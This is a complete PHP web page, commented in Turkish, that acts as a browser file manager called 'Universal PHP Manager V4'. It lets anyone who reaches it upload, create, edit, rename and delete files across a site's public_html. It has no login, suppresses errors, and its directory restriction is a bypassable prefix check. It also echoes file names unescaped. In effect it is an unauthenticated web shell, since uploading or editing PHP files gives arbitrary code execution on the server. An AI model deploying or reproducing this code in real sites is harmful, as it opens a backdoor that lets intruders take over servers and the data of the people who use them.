<?php
/**
 * Universal PHP Manager V4
 * Özellikler: Auto-Path, Upload, Edit, Delete, Rename, New File
 */

error_reporting(0); // Hataları gizle (bazı hostlarda uyarılar arayüzü bozar)

// 1. DINAMIK YOL AYARLARI
$script_path = str_replace('\\', '/', dirname(__FILE__));
$base_dir = $script_path; 

// public_html tespiti (Geri gidebilmek için)
$root_pos = strpos($script_path, 'public_html');
if ($root_pos !== false) {
    $base_dir = substr($script_path, 0, $root_pos + 11);
}

$current_dir = isset($_GET['dir']) ? str_replace('\\', '/', $_GET['dir']) : $script_path;

// Güvenlik: Base dizin dışına çıkışı engelle
if (strpos($current_dir, $base_dir) !== 0) {
    $current_dir = $base_dir;
}

$msg = ""; $error = "";

// --- İŞLEMLER ---

// A. Yeni Dosya Oluşturma
if (isset($_POST['new_file'])) {
    $new_name = basename($_POST['new_filename']);
    $path = rtrim($current_dir, '/') . '/' . $new_name;
    if (!file_exists($path)) {
        file_put_contents($path, "");
        $msg = "Dosya oluşturuldu: $new_name";
    } else { $error = "Dosya zaten mevcut!"; }
}

// B. İsim Değiştirme (Rename)
if (isset($_POST['rename_file'])) {
    $old = rtrim($current_dir, '/') . '/' . basename($_POST['old_name']);
    $new = rtrim($current_dir, '/') . '/' . basename($_POST['new_name']);
    if (rename($old, $new)) { $msg = "İsim değiştirildi."; }
    else { $error = "Hata oluştu!"; }
}

// C. Dosya Yükleme
if (isset($_FILES['uploaddata'])) {
    $dest = rtrim($current_dir, '/') . '/' . basename($_FILES['uploaddata']['name']);
    if (move_uploaded_file($_FILES['uploaddata']['tmp_name'], $dest)) { $msg = "Yüklendi."; }
    else { $error = "Yükleme başarısız."; }
}

// D. Dosya Silme
if (isset($_GET['delete'])) {
    $target = rtrim($current_dir, '/') . '/' . basename($_GET['delete']);
    if (is_file($target)) { unlink($target); $msg = "Silindi."; }
}

// E. Kaydetme
if (isset($_POST['save_content'])) {
    $target = rtrim($current_dir, '/') . '/' . basename($_POST['filename']);
    file_put_contents($target, $_POST['content']);
    $msg = "Kaydedildi.";
}

// Listeleme
$items = array_diff(scandir($current_dir), array('.', '..'));
$parent_dir = dirname($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP Manager V4</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; }
        .container { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; }
        a { color: #0f0; text-decoration: none; }
        a:hover { background: #0f0; color: #000; }
        .nav { margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px dashed #0f0; }
        .actions { background: #111; padding: 10px; margin-bottom: 10px; border: 1px solid #333; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 8px; border-bottom: 1px solid #222; }
        input, textarea { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        .btn { cursor: pointer; background: #0f0; color: #000; font-weight: bold; padding: 5px 10px; border: none; }
        .status { color: yellow; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="container">
    <div class="nav">
        <strong>KONUM:</strong> <?php echo $current_dir; ?><br>
        <?php if (strlen($current_dir) > strlen($base_dir)): ?>
            <a href="?dir=<?php echo urlencode($parent_dir); ?>">[ .. Üst Dizin ]</a>
        <?php endif; ?>
    </div>

    <div class="status"><?php echo $msg . $error; ?></div>

    <?php if (!isset($_GET['edit']) && !isset($_GET['rename'])): ?>
        <div class="actions">
            <form method="post" enctype="multipart/form-data" style="display:inline;">
                Yükle: <input type="file" name="uploaddata"> <input type="submit" value="YÜKLE" class="btn">
            </form>
            <form method="post" style="display:inline; margin-left:20px;">
                Yeni Dosya: <input type="text" name="new_filename" placeholder="dosya.txt"> <input type="submit" name="new_file" value="OLUŞTUR" class="btn">
            </form>
        </div>

        <table>
            <?php foreach ($items as $item): 
                $path = rtrim($current_dir, '/') . '/' . $item;
                $is_dir = is_dir($path);
            ?>
            <tr>
                <td width="30"><?php echo $is_dir ? "[D]" : "[F]"; ?></td>
                <td>
                    <?php if ($is_dir): ?>
                        <a href="?dir=<?php echo urlencode($path); ?>"><?php echo $item; ?>/</a>
                    <?php else: ?>
                        <?php echo $item; ?>
                    <?php endif; ?>
                </td>
                <td style="text-align:right;">
                    <?php if (!$is_dir): ?>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>">[Düzenle]</a>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&rename=<?php echo urlencode($item); ?>">[İsim]</a>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item); ?>" onclick="return confirm('Silinsin mi?')">[Sil]</a>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>

    <?php elseif (isset($_GET['rename'])): ?>
        <h3>İsim Değiştir: <?php echo htmlspecialchars($_GET['rename']); ?></h3>
        <form method="post">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
            Yeni İsim: <input type="text" name="new_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
            <input type="submit" name="rename_file" value="DEĞİŞTİR" class="btn">
            <a href="?dir=<?php echo urlencode($current_dir); ?>">[İptal]</a>
        </form>

    <?php elseif (isset($_GET['edit'])): 
        $file = basename($_GET['edit']);
        $content = file_get_contents(rtrim($current_dir, '/') . '/' . $file);
    ?>
        <h3>Düzenle: <?php echo $file; ?></h3>
        <form method="post">
            <input type="hidden" name="filename" value="<?php echo $file; ?>">
            <textarea name="content" style="width:100%; height:400px;"><?php echo htmlspecialchars($content); ?></textarea><br><br>
            <input type="submit" name="save_content" value="KAYDET" class="btn">
            <a href="?dir=<?php echo urlencode($current_dir); ?>">[Geri]</a>
        </form>
    <?php endif; ?>
</div>

</body>
</html>